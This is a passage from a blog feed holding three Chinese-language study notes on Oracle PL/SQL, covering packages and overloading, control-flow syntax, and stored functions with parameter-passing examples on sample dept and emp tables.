    <url>/2019/12/17/Oracle/plsql%E5%8C%85/</url>
    <content><![CDATA[<h1 id="plsql包"><a href="#plsql包" class="headerlink" title="plsql包"></a>plsql包</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>包是一组相关过程、函数、变量、常量和游标等PL/SQL程序设计元素的组合，它具有面向对象程序设计语言的特点，是对这些PL/SQL 程序设计元素的封装。</li>
<li>包类似于C++和JAVA语言中的类<ul>
<li>其中变量相当于类中的成员变量，过程和函数相当于类方法。</li>
<li>把相关的模块归类成为包，可使开发人员利用面向对象的方法进行存储过程的开发，从而提高系统性能。</li>
</ul>
</li>
<li>与类相同，包中的程序元素也分为公用元素和私用元素两种，这两种元素的区别是他们允许访问的程序范围不同，即它们的作用域不同。<ul>
<li>公用元素不仅可以被包中的函数、过程所调用，也可以被包外的PL/SQL程序访问，</li>
<li>私有元素只能被包内的函数和过程序所访问。</li>
</ul>
</li>
<li>在PL/SQL程序设计中，使用包不仅可以使程序设计模块化，对外隐藏包内所使用的信息（通过使用私用变量），而且可以提高程序的执行效率。<ul>
<li>因为，当程序首次调用包内函数或过程时，ORACLE将整个包调入内存，当再次访问包内元素时，ORACLE直接从内存中读取，而不需要进行磁盘I/O操作，从而使程序执行效率得到提高<a id="more"></a>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2></li>
</ul>
</li>
</ul>
<p>一个包由两个分开的部分组成</p>
<ul>
<li><p>包定义</p>
<p>（PACKAGE）</p>
<ul>
<li>包定义部分声明包内数据类型、变量、常量、游标、子程序和异常错误处理等元素。</li>
<li>这些元素为包的<strong>公有元素</strong>。</li>
</ul>
</li>
<li><p>包主体</p>
<p>（PACKAGE BODY）</p>
<ul>
<li>包主体则是包定义部分的具体实现，它定义了包定义部分所声明的游标和子程序。</li>
<li>包主体中可以声明包的<strong>私有元素</strong>。</li>
</ul>
</li>
</ul>
<p><strong>注：</strong></p>
<p>包定义和包主体分开编译，并作为两部分分开的对象存放在数据库字典中。</p>
<h2 id="包定义"><a href="#包定义" class="headerlink" title="包定义"></a>包定义</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PACKAGE package_name </span><br><span class="line">&#123;IS | AS&#125; </span><br><span class="line">  [公有数据类型定义[公有数据类型定义]…] </span><br><span class="line">  [公有游标声明[公有游标声明]…] </span><br><span class="line">  [公有变量、常量声明[公有变量、常量声明]…] </span><br><span class="line">  [公有子程序声明[公有子程序声明]…] </span><br><span class="line">END [package_name];</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>在Oracle的存储过程和函数中，其实IS和AS是同义词。</li>
<li>还有在自定义类型（TPYE）和包（PACKAGE）时，使用IS和AS也并没有什么区别。</li>
<li>但是在创建视图（VIEW）时，只能使用AS而不能使用IS。</li>
<li>在声明游标（CURSOR）时，只能使用IS而不能使用AS。</li>
</ul>
<h2 id="包主体"><a href="#包主体" class="headerlink" title="包主体"></a>包主体</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PACKAGE BODY package_name </span><br><span class="line">&#123;IS | AS&#125; </span><br><span class="line">  [私有数据类型定义[私有数据类型定义]…] </span><br><span class="line">  [私有变量、常量声明[私有变量、常量声明]…] </span><br><span class="line">  [私有子程序声明和定义[私有子程序声明和定义]…] </span><br><span class="line">  [公有游标定义[公有游标定义]…] </span><br><span class="line">  [公有子程序定义[公有子程序定义]…] </span><br><span class="line">[BEGIN </span><br><span class="line">  PL&#x2F;SQL 语句] </span><br><span class="line">END [package_name];</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<p>在包主体定义公有程序时，它们必须与包定义中所声明子程序的格式完全一致</p>
<h2 id="创建包应用举例"><a href="#创建包应用举例" class="headerlink" title="创建包应用举例"></a>创建包应用举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">例1:创建的包为demo_pack。 </span><br><span class="line">对dept表进行插入、查询和修改操作，并通过demo_pack包中的记录变量</span><br><span class="line">DeptRec 显示所查询到的数据库信息。 </span><br><span class="line">该包中包含一个记录类型变量DeptRec、两个函数和一个过程。： </span><br><span class="line">*&#x2F;</span><br><span class="line">CREATE OR REPLACE PACKAGE demo_pack </span><br><span class="line">IS </span><br><span class="line">	DeptRec dept%ROWTYPE; </span><br><span class="line">	FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) </span><br><span class="line">   		RETURN NUMBER; </span><br><span class="line">  	FUNCTION remove_dept(dept_no NUMBER) </span><br><span class="line">   		RETURN NUMBER; </span><br><span class="line">  	PROCEDURE query_dept(dept_no IN NUMBER); </span><br><span class="line">END demo_pack;  </span><br><span class="line"></span><br><span class="line">--包主体部分：</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY demo_pack </span><br><span class="line">IS  </span><br><span class="line">	FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) </span><br><span class="line">  		RETURN NUMBER </span><br><span class="line">	IS  </span><br><span class="line">   		empno_remaining EXCEPTION; </span><br><span class="line">     	PRAGMA EXCEPTION_INIT(empno_remaining, -1); </span><br><span class="line">	&#x2F;* -1 本身是违反唯一约束条件的错误代码，为已预定义DUP_VAL_ON_INDEX *&#x2F; </span><br><span class="line">	BEGIN </span><br><span class="line">		INSERT INTO dept VALUES(dept_no, dept_name, location); </span><br><span class="line">		IF SQL%FOUND THEN </span><br><span class="line">			RETURN 1; </span><br><span class="line">		END IF; </span><br><span class="line">		EXCEPTION </span><br><span class="line">			WHEN empno_remaining THEN  </span><br><span class="line">     			RETURN 0; </span><br><span class="line">    		WHEN OTHERS THEN </span><br><span class="line">     			RETURN -1; </span><br><span class="line">	END add_dept;</span><br><span class="line">	FUNCTION remove_dept(dept_no NUMBER) </span><br><span class="line">  		RETURN NUMBER </span><br><span class="line">  	IS  </span><br><span class="line">   	BEGIN </span><br><span class="line">    	DELETE FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">      	IF SQL%FOUND THEN </span><br><span class="line">     		RETURN 1; </span><br><span class="line">    	ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line">      	END IF; </span><br><span class="line">   		EXCEPTION </span><br><span class="line">    		WHEN OTHERS THEN </span><br><span class="line">     			RETURN -1; </span><br><span class="line">	END remove_dept;</span><br><span class="line">	PROCEDURE query_dept (dept_no IN NUMBER) </span><br><span class="line">	IS </span><br><span class="line"> 	BEGIN </span><br><span class="line">   		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line"> 		EXCEPTION </span><br><span class="line">      	WHEN NO_DATA_FOUND THEN   </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;数据库中没有编码为&#39;||dept_no||&#39;的部门&#39;); </span><br><span class="line">      	WHEN TOO_MANY_ROWS THEN </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;程序运行错误!请使用游标&#39;); </span><br><span class="line">      	WHEN OTHERS THEN </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line"> 	END query_dept; </span><br><span class="line">END demo_pack;</span><br></pre></td></tr></table></figure>
<h2 id="调用包应用举例"><a href="#调用包应用举例" class="headerlink" title="调用包应用举例"></a>调用包应用举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">	Var NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">  	Var :&#x3D; demo_pack.add_dept(90,&#39;Administration&#39;, &#39;Beijing&#39;); </span><br><span class="line">  	IF var &#x3D;-1 THEN </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line">  	ELSIF var &#x3D;0 THEN </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(&#39;该部门记录已经存在！&#39;); </span><br><span class="line">  	ELSE </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(&#39;添加记录成功！&#39;); </span><br><span class="line">    	Demo_pack.query_dept(90); </span><br><span class="line">    	DBMS_OUTPUT.PUT_LINE(demo_pack.DeptRec.deptno||&#39;---&#39;|| </span><br><span class="line">    	demo_pack.DeptRec.dname||&#39;---&#39;||demo_pack.DeptRec.loc); </span><br><span class="line">    	var :&#x3D; demo_pack.remove_dept(90); </span><br><span class="line">    	IF var &#x3D;-1 THEN </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); </span><br><span class="line">    	ELSIF var&#x3D;0 THEN </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(&#39;该部门记录不存在！&#39;); </span><br><span class="line">    	ELSE </span><br><span class="line">     		DBMS_OUTPUT.PUT_LINE(&#39;删除记录成功！&#39;); </span><br><span class="line">    	END IF; </span><br><span class="line">	END IF; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="包的开发步骤"><a href="#包的开发步骤" class="headerlink" title="包的开发步骤"></a>包的开发步骤</h2><ul>
<li>将每个存储过程调试正确</li>
<li>用文本编辑软件将各个存储过程和函数集成在一起</li>
<li>按照包的定义要求将集成的文本的前面加上包定义</li>
<li>按照包的定义要求将集成的文本的前面加上包定义</li>
<li>使用开发工具进行调式</li>
</ul>
<h2 id="子程序重载"><a href="#子程序重载" class="headerlink" title="子程序重载"></a>子程序重载</h2><p>PL/SQL 允许对包内子程序和本地子程序进行重载。所谓重载时指两个或多个子程序有相同的名称，但拥有不同的参数变量 参数变量、参数顺序 参数顺序或参数数据类型 参数数据类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例子</span><br><span class="line">--包定义</span><br><span class="line">CREATE OR REPLACE PACKAGE demo_pack1 </span><br><span class="line">IS </span><br><span class="line"> 	DeptRec dept%ROWTYPE; </span><br><span class="line"> 	FUNCTION query_dept(dept_no IN NUMBER) </span><br><span class="line">  		RETURN INTEGER; </span><br><span class="line"> 	FUNCTION query_dept(dept_no IN VARCHAR2) </span><br><span class="line">  		RETURN INTEGER; </span><br><span class="line">END demo_pack1;</span><br><span class="line">--包主体</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY demo_pack1 </span><br><span class="line">IS  </span><br><span class="line">	FUNCTION query_dept(dept_no IN NUMBER) </span><br><span class="line"> 		RETURN INTEGER </span><br><span class="line">    IS </span><br><span class="line">    BEGIN </span><br><span class="line"> 		IF dept_no &#x3D;10 THEN </span><br><span class="line">     		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">     		RETURN 1; </span><br><span class="line"> 		ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line"> 		END IF; </span><br><span class="line">	END query_dept;</span><br><span class="line">	FUNCTION query_dept(dept_no IN VARCHAR2) </span><br><span class="line"> 		RETURN INTEGER </span><br><span class="line">    IS </span><br><span class="line">    BEGIN </span><br><span class="line"> 		IF dept_no &#x3D;10 THEN </span><br><span class="line">     		SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; </span><br><span class="line">     	RETURN 1; </span><br><span class="line"> 		ELSE </span><br><span class="line">     		RETURN 0; </span><br><span class="line"> 		END IF; </span><br><span class="line">    END query_dept; </span><br><span class="line">END demo_pack1;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li><p>如果两个子程序的参数只是名称和方式不同时，不能重载他们。</p>
<ul>
<li><p>PROCEDURE OverlodeMe（P_parameter in number）</p>
<p>PROCEDURE OverlodeMe（P_parameter out number）</p>
</li>
<li><p>PROCEDURE OverlodeMe（P_parameter number）<br>PROCEDURE OverlodeMe（P_para number）</p>
</li>
</ul>
</li>
<li><p>不能只根据两个函数的返回类型进行重载</p>
<ul>
<li>FUNCTION Overlodeme RETURN date<br>FUNCTION Overlodeme RETURN boolean</li>
</ul>
</li>
<li><p>重载函数的参数必须在类型系列方面有所不同，既不能再同一类 型系列上重载：即字符、数值、日期等等</p>
<ul>
<li>PROCEDURE OverlodeMe（P_parameter in char）<br>PROCEDURE OverlodeMe（P_parameter out varchar2(10)）</li>
</ul>
</li>
</ul>
<h2 id="删除包"><a href="#删除包" class="headerlink" title="删除包"></a>删除包</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP PACKAGE [BODY] [user.]package_name </span><br><span class="line"></span><br><span class="line">--例：</span><br><span class="line">DROP PACKAGE emp_package;</span><br></pre></td></tr></table></figure>
<p><strong>包所涉及到的数据字典视图：</strong></p>
<ul>
<li>DBA_SOURCE</li>
<li>USER_SOURCE</li>
<li>USER_ERRORS</li>
<li>DBA_OBJECTS</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>PL/SQL基本语法</title>
    <url>/2019/12/17/Oracle/plsql%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="PL-SQL基本语法"><a href="#PL-SQL基本语法" class="headerlink" title="PL/SQL基本语法"></a>PL/SQL基本语法</h1><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><p>在SQLPLUS中不论是SQL还是PL/SQL，对数据表的改动。<br>最后都需要commit; 完成实例与数据文件的交互。</p>
<a id="more"></a>

<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="条件语句-IF语句-CASE语句"><a href="#条件语句-IF语句-CASE语句" class="headerlink" title="条件语句:IF语句,CASE语句"></a>条件语句:IF语句,CASE语句</h3><h4 id="IF语句的基本形式为-："><a href="#IF语句的基本形式为-：" class="headerlink" title="IF语句的基本形式为 ："></a>IF语句的基本形式为 ：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IF &lt;布尔表达式&gt; THEN </span><br><span class="line">	PL&#x2F;SQL和 SQL语句 </span><br><span class="line">END IF; </span><br><span class="line">或   </span><br><span class="line">IF &lt;布尔表达式&gt; THEN </span><br><span class="line">	PL&#x2F;SQL 和 SQL语句 </span><br><span class="line">ELSE</span><br><span class="line">	PL其它语句 </span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure>
<p>注:&lt;布尔表达式&gt;最后返回TRUE or FALSE or NULL<br>仅当为TRUE时执行THEN后面的语句。</p>
<table>
<thead>
<tr>
<th align="left">判断</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NULL AND TRUE</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">NULL AND FALSE</td>
<td align="left">FALSE</td>
</tr>
<tr>
<td align="left">NULL AND NULL</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">NULL OR TRUE</td>
<td align="left">TRUE</td>
</tr>
<tr>
<td align="left">NULL OR FALSE</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">NULL OR NULL</td>
<td align="left">NULL</td>
</tr>
</tbody></table>
<h5 id="NVL函数"><a href="#NVL函数" class="headerlink" title="NVL函数"></a>NVL函数</h5><p><code>**NVL(E1, E2)**</code><br>如果E1为NULL，则函数返回E2，否则返回E1本身。</p>
<p><code>**NVL2(E1, E2, E3)**</code><br>如果E1为NULL，则函数返回E3，若E1不为null，则返回E2。</p>
<h4 id="CASE语句的基本形式为-："><a href="#CASE语句的基本形式为-：" class="headerlink" title="CASE语句的基本形式为 ："></a>CASE语句的基本形式为 ：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CASE selector </span><br><span class="line">	WHEN expression1 THEN result1 </span><br><span class="line">	WHEN expression2 THEN result2 </span><br><span class="line">	WHEN expressionN THEN resultN </span><br><span class="line">	[ ELSE resultN+1] </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="循环语句-LOOP语句-EXIT语句"><a href="#循环语句-LOOP语句-EXIT语句" class="headerlink" title="循环语句:LOOP语句,EXIT语句"></a>循环语句:LOOP语句,EXIT语句</h3><h4 id="简单循环语句的一般形式："><a href="#简单循环语句的一般形式：" class="headerlink" title="简单循环语句的一般形式："></a>简单循环语句的一般形式：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOOP </span><br><span class="line">  要执行的语句; </span><br><span class="line">  EXIT WHEN &lt;条件语句&gt; &#x2F;*条件满足，退出循环语句*&#x2F; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>EXIT WHEN 子句是必须的，否则循环将无法停止。</p>
<h4 id="WHILE-循环语句的一般形式："><a href="#WHILE-循环语句的一般形式：" class="headerlink" title="WHILE 循环语句的一般形式："></a>WHILE 循环语句的一般形式：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WHILE &lt;布尔表达式&gt; LOOP </span><br><span class="line">    要执行的语句; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>while循环语句执行的顺序是先判断&lt;布尔表达式&gt;的真假，如果为真则循环执行，否则退出循环。</li>
<li>在WHILE循环语句中仍然可以使用EXIT或EXIT WHEN子句</li>
</ul>
<h4 id="FOR循环语句的一般形式："><a href="#FOR循环语句的一般形式：" class="headerlink" title="FOR循环语句的一般形式："></a>FOR循环语句的一般形式：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR 循环计数器 IN [ REVERSE ] 下限 .. 上限 LOOP </span><br><span class="line">  要执行的语句; </span><br><span class="line">END LOOP;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>每循环一次，循环变量自动加1；使用关键字REVERSE，循环变量<br>自动减1</li>
<li>跟在IN REVERSE 后面的数字必须是从小到大的顺序，但不一定是<br>整数，可以是能够转换成整数的变量或表达式</li>
<li>可以使用EXIT或者EXIT WHEN子句退出循环</li>
</ul>
<h5 id="RETURN、EXIT、CONTINUE语句"><a href="#RETURN、EXIT、CONTINUE语句" class="headerlink" title="RETURN、EXIT、CONTINUE语句"></a>RETURN、EXIT、CONTINUE语句</h5><p><strong>RETURN：</strong>直接跳出块、存储过程或者函数</p>
<p><strong>EXIT：</strong>跳出本循环转而执行本循环的上一级循环的下一次循环。</p>
<p><strong>CONTIUNE：</strong>本次循环后面的代码部分不再执行，转而执行本循环的下一次循环。</p>
<h3 id="顺序语句-GOTO语句-NULL语句"><a href="#顺序语句-GOTO语句-NULL语句" class="headerlink" title="顺序语句:GOTO语句,NULL语句"></a>顺序语句:GOTO语句,NULL语句</h3><h4 id="GOTO语句的一般形式："><a href="#GOTO语句的一般形式：" class="headerlink" title="GOTO语句的一般形式："></a>GOTO语句的一般形式：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GOTO   label;  </span><br><span class="line">. . .  . . . </span><br><span class="line">&lt;&lt;label&gt;&gt; </span><br><span class="line">&#x2F;*标号是用&lt;&lt; &gt;&gt;括起来的标识符 *&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>GOTO语句是无条件跳转到指定的标号去的意思</p>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line">   V_counter NUMBER :&#x3D; 1; </span><br><span class="line"> BEGIN </span><br><span class="line">   LOOP  </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;V_counter的当前值为:&#39;||V_counter); </span><br><span class="line"> V_counter :&#x3D; v_counter + 1; </span><br><span class="line"> IF v_counter &gt; 10 THEN </span><br><span class="line">     GOTO l_ENDofLOOP; </span><br><span class="line"> END IF; </span><br><span class="line">   END LOOP; </span><br><span class="line">   &lt;&lt;l_ENDofLOOP&gt;&gt; </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;V_counter的当前值为:&#39;||V_counter); </span><br><span class="line"> END ;</span><br></pre></td></tr></table></figure>
<h4 id="NULL语句："><a href="#NULL语句：" class="headerlink" title="NULL语句："></a>NULL语句：</h4><p>在PL/SQL 程序中，可以用 null 语句来说明“不用做任何事情”的意思，<br>相当于一个占位符，可以使某些语句变得有意义，提高程序的可读性</p>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE </span><br><span class="line"> . . . </span><br><span class="line">BEGIN </span><br><span class="line"> . . . </span><br><span class="line">IF v_num IS NULL THEN </span><br><span class="line">	GOTO print1; </span><br><span class="line">END IF;  </span><br><span class="line"> . . . </span><br><span class="line">&lt;&lt;print1&gt;&gt; </span><br><span class="line">	NULL;-- 不需要处理任何数据。 </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsql存储函数和过程</title>
    <url>/2019/12/17/Oracle/plsql%E5%AD%98%E5%82%A8%E5%87%BD%E6%95%B0%E5%92%8C%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="plsql存储函数和过程"><a href="#plsql存储函数和过程" class="headerlink" title="plsql存储函数和过程"></a>plsql存储函数和过程</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ul>
<li>ORACLE 提供可以把PL/SQL 程序存储在数据库中，并可以在任何地方来运行它（写好的存储函数和过程就同Oracle原有的函数一样）。这样就叫存储过程或函数。</li>
<li>过程和函数统称为PL/SQL子程序，他们是被命名的PL/SQL块，均存储在数据库中，并通过输入、输出参数或输入/输出参数与其调用者交换信息。</li>
<li>过程和函数的唯一区别是函数总向调用者返回数据，而过程则不返回数据。<a id="more"></a>
<h2 id="存储函数"><a href="#存储函数" class="headerlink" title="存储函数"></a>存储函数</h2></li>
</ul>
<h3 id="创建存储函数"><a href="#创建存储函数" class="headerlink" title="创建存储函数"></a>创建存储函数</h3><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] FUNCTION function_name </span><br><span class="line">[ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type ， </span><br><span class="line">   argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] </span><br><span class="line">RETURN return_type  </span><br><span class="line">&#123; IS | AS &#125; </span><br><span class="line">&lt;类型.变量的说明&gt;   </span><br><span class="line">BEGIN </span><br><span class="line">   FUNCTION_body </span><br><span class="line">EXCEPTION </span><br><span class="line">   其它语句 </span><br><span class="line">END;  </span><br><span class="line">--注： OR REPLACE有无的区别。</span><br></pre></td></tr></table></figure>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例：获取某部门员工数和工资总和 </span><br><span class="line">CREATE OR REPLACE FUNCTION get_salary(</span><br><span class="line">    Dept_no NUMBER, </span><br><span class="line">    Emp_count OUT NUMBER) </span><br><span class="line">RETURN NUMBER  </span><br><span class="line">IS </span><br><span class="line">    V_sum NUMBER;</span><br><span class="line">BEGIN </span><br><span class="line"> 	SELECT SUM(sal), count(*) INTO V_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no;</span><br><span class="line">  	--emp表中dept_no是唯一Key </span><br><span class="line"> 	RETURN v_sum; </span><br><span class="line">EXCEPTION </span><br><span class="line">     WHEN NO_DATA_FOUND THEN  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); </span><br><span class="line">     WHEN OTHERS THEN  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line">END get_salary;</span><br></pre></td></tr></table></figure>
<h3 id="调用函数方法"><a href="#调用函数方法" class="headerlink" title="调用函数方法"></a>调用函数方法</h3><ul>
<li>函数声明时所定义的参数称为形式参数，应用程序调用时为函数传递的参数称为实际参数。</li>
<li>应用程序在调用函数时，可以使用以下三种方法向函数传递参数：</li>
</ul>
<h4 id="位置表示法"><a href="#位置表示法" class="headerlink" title="位置表示法"></a>位置表示法</h4><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argument_value1[,argument_value2 …]</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>类型序列必须与函数声明是的类型序列相同</p>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例：计算某部门的员工数和工资总和 </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">	V_sum NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">	V_sum :&#x3D;get_salary(30, v_num); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="名称表示法"><a href="#名称表示法" class="headerlink" title="名称表示法"></a>名称表示法</h4><h5 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argument &#x3D;&gt; parameter [,…]</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>argument 为形式参数，它必须与函数定义时所声明的形式参数名称以及类型相同。Parameter 为实际参数。</li>
<li>在这种格式中，形式参数与实际参数成对出现，相互间关系唯一确定，所以参数的顺序可以任意排列。</li>
</ul>
<h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例：计算某部门的员工数和工资总和 </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">	V_sum NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">	V_sum :&#x3D;get_salary(emp_count &#x3D;&gt; v_num, dept_no &#x3D;&gt; 30); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="混合表示法"><a href="#混合表示法" class="headerlink" title="混合表示法"></a>混合表示法</h4><ul>
<li>即在调用一个函数时，同时使用位置表示法和名称表示法为函数传递参数。</li>
<li>采用这种参数传递方法时，使用<strong>位置表示法</strong>所传递的参数必须放在<strong>名称表示法</strong>所传递的参数<strong>前面</strong>。</li>
<li>也就是说，无论函数具有多少个参数，只要其中有一个参数使用名称表示法，其后所有的参数都必须使用名称表示法。</li>
</ul>
<h5 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例： </span><br><span class="line">DECLARE  </span><br><span class="line">    Var VARCHAR2(32); </span><br><span class="line">BEGIN </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user1&#39;, 30, sex &#x3D;&gt; &#39;男&#39;); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40, sex &#x3D;&gt; &#39;男&#39;); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;女&#39;, age &#x3D;&gt; 20); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="参数默认值"><a href="#参数默认值" class="headerlink" title="参数默认值"></a>参数默认值</h4><p>在CREATE OR REPLACE FUNCTION 语句中声明函数参数时可以使用DEFAULT关键字为输入参数指定默认值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--定义示例： </span><br><span class="line">CREATE OR REPLACE FUNCTION demo_fun( </span><br><span class="line">	Name VARCHAR2,Age INTEGER, </span><br><span class="line">	Sex VARCHAR2 DEFAULT &#39;男&#39;) </span><br><span class="line">RETURN VARCHAR2  </span><br><span class="line">IS </span><br><span class="line">   V_var VARCHAR2(32); </span><br><span class="line">BEGIN </span><br><span class="line">	V_var :&#x3D; name||&#39;：&#39;||TO_CHAR(age)||&#39;岁，&#39;||sex; </span><br><span class="line">   RETURN v_var; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>具有默认值的函数创建后，在函数调用时，如果没有为具有默认值的参数提供实际参数值，函数将使用该参数的默认值。</li>
<li>但当调用者为默认参数提供实际参数时，函数将使用实际参数值。</li>
<li>在创建函数时，只能为输入参数设置默认值，而不能为输入/输出参数设置默认值。</li>
</ul>
